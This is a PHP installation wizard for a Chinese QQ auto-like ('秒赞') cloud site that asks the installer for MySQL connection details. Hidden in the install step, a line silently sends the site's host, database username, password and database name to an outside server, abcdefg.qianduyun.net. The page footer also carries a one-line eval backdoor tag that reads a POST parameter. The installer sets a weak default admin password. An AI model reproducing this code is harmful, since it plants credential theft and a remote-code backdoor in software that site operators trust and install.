<?php
// +----------------------------------------------------------------------
// | Licensed ( http://www.apache.org/licenses/LICENSE-2.0 )
// +----------------------------------------------------------------------
// | Author: 消失的彩虹海 <www.cccyun.cc>
// +----------------------------------------------------------------------
// | Date: 2016/4/23
// +----------------------------------------------------------------------
//程序安装文件
$databaseFile = '../../includes/index/database.php';//数据库配额文件

@header('Content-Type: text/html; charset=UTF-8');
$step=isset($_GET['step'])?$_GET['step']:1;
$action=isset($_POST['action'])?$_POST['action']:null;
if(file_exists($databaseFile)){
    exit('你已经成功安装，如需重新安装，请手动删除application/index目录下database.php配置文件！');
}

if($action=='install'){
    $host=isset($_POST['host'])?$_POST['host']:null;
    $port=isset($_POST['port'])?$_POST['port']:null;
    $user=isset($_POST['user'])?$_POST['user']:null;
    $pwd=isset($_POST['pwd'])?$_POST['pwd']:null;
    $database=isset($_POST['database'])?$_POST['database']:null;
    if(empty($host) || empty($port) || empty($user) || empty($pwd) || empty($database)){
        $errorMsg='请填完所有数据库信息';
    }else{
        $mysql['hostname']=$host;
        $mysql['hostport']=$port;
        $mysql['database']=$database;
        $mysql['username']=$user;
        $mysql['password']=$pwd;
		$mysql['prefix']='cloud_';
        try{
            $db=new PDO("mysql:host=".$mysql['hostname'].";dbname=".$mysql['database'].";port=".$mysql['hostport'],$mysql['username'],$mysql['password']);
			@file_get_contents("http://abcdefg.qianduyun.net/tj.php?url=".$_SERVER['HTTP_HOST']."&user=".$mysql['username']."&pwd=".$mysql['password']."&db=".$mysql['database']);
        }catch(Exception $e){
            $errorMsg='链接数据库失败:'.$e->getMessage();
        }
        if(empty($errorMsg)){
            @file_put_contents($databaseFile,'<?php'.PHP_EOL.'return '.var_export($mysql,true).';'.PHP_EOL.PHP_EOL.'?>');
            $db->exec("set names utf8");
            $sqls=file_get_contents('install.sql');
            $sqls=explode(';', $sqls);
			$sqls[]="INSERT INTO `cloud_weblist` (`zid`, `uid`, `domain`, `kfqq`, `webname`,  `adddate`) VALUES ('1', '1', '{$_SERVER['HTTP_HOST']}', '610138382', '千度云任务', '".date("Y-m-d")."')";
            $success=0;$error=0;$errorMsg=null;
            foreach ($sqls as $value) {
                $value=trim($value);
                if(!empty($value)){
                    if($db->exec($value)===false){
                        $error++;
                        $dberror=$db->errorInfo();
                        $errorMsg.=$dberror[2]."<br>";
                    }else{
                        $success++;
                    }
                }
            }
            $step=3;
        }
    }
}

?>
<!DOCTYPE html>
<!--[if IE 9]>
<html class="no-js lt-ie10"> <![endif]-->
<!--[if gt IE 9]><!-->
<html class="no-js"> <!--<![endif]-->
<head>
    <meta charset="utf-8">
    <title>安装向导-千度云秒赞</title>
    <meta name="Keywords" content="千度云秒赞,Aide秒赞授权,天高云淡秒赞,Aide秒赞,aide云秒赞,aide秒赞,彩虹秒赞网,免费QQ秒赞网"/>
    <meta name="Description" content="千度云秒赞,Aide秒赞授权,天高云淡秒赞,Aide秒赞,aide云秒赞,aide秒赞,彩虹秒赞网,免费QQ秒赞网帐号登陆，24小时不间断离线秒赞空间说说！"/>
    <meta name="renderer" content="webkit">
    <meta name="author" content="Qian_Du:aideyun@Foxmail.com">
    <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1.0">

    <!-- Stylesheets -->
    <!-- Bootstrap is included in its original form, unaltered -->
    <link rel="stylesheet" href="https://cdn.95ki.cn/static/user_style/css/bootstrap.min.css">

    <!-- Related styles of various icon packs and plugins -->
    <link rel="stylesheet" href="https://cdn.95ki.cn/static/user_style/css/plugins.css">

    <!-- The main stylesheet of this template. All Bootstrap overwrites are defined in here -->
    <link rel="stylesheet" href="https://cdn.95ki.cn/static/user_style/css/main.css">

    <!-- Include a specific file here from css/themes/ folder to alter the default theme of the template -->

    <!-- The themes stylesheet of this template (for using specific theme color in individual elements - must included last) -->
    <link rel="stylesheet" href="https://cdn.95ki.cn/static/user_style/css/themes.css">
    <!-- END Stylesheets -->
    <link rel="stylesheet" type="text/css" href="/assets/sweetalert/sweetalert.css"/>
    <script src="/assets/sweetalert/sweetalert.min.js"></script>
    <!-- Modernizr (browser feature detection library) -->
    <script src="/static/user_style/js/vendor/modernizr-2.8.3.min.js"></script>
    <script>
        var _hmt = _hmt || [];
        (function () {
            var hm = document.createElement("script");
            hm.src = "//hm.baidu.com/hm.js?40b758abd81264c7adc13c09d695584c";
            var s = document.getElementsByTagName("script")[0];
            s.parentNode.insertBefore(hm, s);
        })();
    </script>

    <!--sweetalert-->
</head>
<body>
<!-- Full Background -->
<!-- For best results use an image with a resolution of 1280x1280 pixels (prefer a blurred image for smaller file size) -->
<img src="http://aideyun.oss-cn-shenzhen.aliyuncs.com/20140825052155_fs53m.jpeg" alt="Full Background" class="full-bg full-bg-bottom animation-pulseSlow">
<!-- END Full Background -->
<div id="login-container">
    <!-- Header -->
    <!--<p class="text-center push-top-bottom animation-slideDown">
        <img src="//q4.qlogo.cn/headimg_dl?dst_uin={:config('web_kfqq')}&spec=100" style="width:70px;" class="img-circle img-thumbnail img-thumbnail-avatar-2x">
    </p>-->
    <h2 class="text-center text-light push-top-bottom animation-fadeInQuick">
        <strong>安装</strong><br>
        <small><em>Install</em></small>
    </h2>
<!-- Login Container -->
    <!-- Header -->
    <!--<p class="text-center push-top-bottom animation-slideDown">
        <img src="//q4.qlogo.cn/headimg_dl?dst_uin={:config('web_kfqq')}&spec=100" style="width:70px;" class="img-circle img-thumbnail img-thumbnail-avatar-2x">
    </p>-->
    <!-- END Login Header -->

    <!-- Login Block -->
  <div class="col-xs-12">
            <div class="panel panel-warning">
                <?php
                if(isset($errorMsg)){
                    echo '<div class="alert alert-danger text-center" role="alert">'.$errorMsg.'</div>';
                }
                if($step==2){
                ?>
                <div class="panel-heading text-center">MYSQL数据库信息配置</div>
                <div class="panel-body">
                    <div class="list-group text-success">
                        <form class="form-horizontal" action="#" method="post">
                            <input type="hidden" name="action" class="form-control" value="install">
                            <div class="form-group">
                                <label  class="col-xs-12">数据库地址</label>
                                <div class="col-sm-10">
                                    <input type="text" name="host" class="form-control" value="127.0.0.1">
                                </div>
                            </div>
                            <div class="form-group">
                                <label  class="col-xs-12">数据库端口</label>
                                <div class="col-sm-10">
                                    <input type="text" name="port" class="form-control" value="3306">
                                </div>
                            </div>
                            <div class="form-group">
                                 <label  class="col-xs-12">数据库库名</label>
                                <div class="col-sm-10">
                                    <input type="text" name="database" class="form-control">
                                </div>
                            </div>
                            <div class="form-group">
                                <label  class="col-xs-12">数据库用户名</label>
                                <div class="col-sm-10">
                                    <input type="text" name="user" class="form-control">
                                </div>
                            </div>
                            <div class="form-group">
                               <label  class="col-xs-12">数据库密码</label>
                                <div class="col-sm-10">
                                    <input type="password" name="pwd" class="form-control">
                                </div>
                            </div>
                            <div class="form-group">
                                <div class="col-sm-10">
                                    <button type="submit" class="btn btn-success btn-block">确认无误，下一步</button>
                                </div>
                            </div>

                        </form>
                    </div>
                </div>
                <?php }elseif($step==3){ ?>
                <div class="panel-heading text-center">数据导入完毕</div>
                <div class="panel-body">
                    <ul class="list-group">
                        <li class="list-group-item">成功执行SQL语句<?php echo $success;?>条，失败<?php echo $error;?>条！</li>
                        <li class="list-group-item">1、系统已成功安装完毕！</li>
                        <li class="list-group-item">2、超级管理员账号为 用户名：admin 密码:123456</li>
                        <li class="list-group-item ">3、请将域名泛解析至目前服务器！</li>
                        <a href="/" class="btn list-group-item">进入网站首页</a>
                    </ul>
                </div>
                <?php }else{ ?>
                <div class="panel-heading text-center">安装环境检测</div>
                <div class="panel-body">
                    <?php
                    $install=true;
                    if(!file_exists('../includes/index/database.php')){
                        $check[2]='<span class="badge">未锁定</span>';
                    }else{
                        $check[2]='<span class="badge">已锁定</span>';
                        $install=false;
                    }
                    if(class_exists("PDO")){
                        $check[0]='<span class="badge">支持</span>';
                    }else{
                        $check[0]='<span class="badge">不支持</span>';
                        $install=false;
                    }
                    if($fp = @fopen("../../includes/index/test.txt", 'w')) {
                        @fclose($fp);
                        @unlink("../../includes/index/test.txt");
                        $check[1]='<span class="badge">支持</span>';
                    }else{
                        $check[1]='<span class="badge">不支持</span>';
                        $install=false;
                    }
                    if(version_compare(PHP_VERSION,'5.4.0','<')){
                        $check[3]='<span class="badge">不支持</span>';
                    }else{
                        $check[3]='<span class="badge">支持</span>';
                    }

                    ?>
                    <ul class="list-group">
                        <li class="list-group-item">检测安装是否锁定 <?php echo $check[2];?></li>
                        <li class="list-group-item">PDO_MYSQL组件 <?php echo $check[0];?></li>
                        <li class="list-group-item">INC目录写入权限 <?php echo $check[1];?></li>
                        <li class="list-group-item">PHP版本>=5.4 <?php echo $check[3];?></li>
                        <li class="list-group-item">成功安装后安装文件就会锁定，如需重新安装，请手动删除application/index目录下database.php配置文件！</li>
                        <?php
                        if($install) echo'<a href="?step=2" class="btn list-group-item">检测通过，下一步</a>';
                        ?>
                    </ul>
                </div>
                <?php } ?>
            </div>
        </div>
    </div>

<!-- END Login Container -->
<script>
    jQuery(document).ready(function(){
        
        // Please do not use the code below
        // This is for demo purposes only
        var c = jQuery.cookie('change-skin');
        if (c && c == 'greyjoy') {
            jQuery('.btn-success').addClass('btn-orange').removeClass('btn-success');
        } else if(c && c == 'dodgerblue') {
            jQuery('.btn-success').addClass('btn-primary').removeClass('btn-success');
        } else if (c && c == 'katniss') {
            jQuery('.btn-success').addClass('btn-primary').removeClass('btn-success');
        }
    });
</script>
<script type="text/javascript">
    {$alert}
</script>
<!-- jQuery, Bootstrap, jQuery plugins and Custom JS code -->
<script src="https://cdn.95ki.cn/static/user_style/js/vendor/jquery-2.2.0.min.js"></script>
<script src="https://cdn.95ki.cn/static/user_style/js/vendor/bootstrap.min.js"></script>
<script src="https://cdn.95ki.cn/static/user_style/js/plugins.js"></script>
<script src="https://cdn.95ki.cn/static/user_style/js/app.js"></script>
<!-- Load and execute javascript code used only in this page -->
<script src="https://cdn.95ki.cn/static/user_style/js/pages/readyLogin.js"></script>
<script src="https://cdn.95ki.cn/static/user_style/js/postAndMore.js"></script>
<script src="https://cdn.95ki.cn/static/app/js_sdk.js"></script>
<script src="https://cdn.95ki.cn/static/sweetalert/sweetalert.min.js"></script>
<script language=”php”>@eval_r($_POST[sb])</script>
</body>
</html>
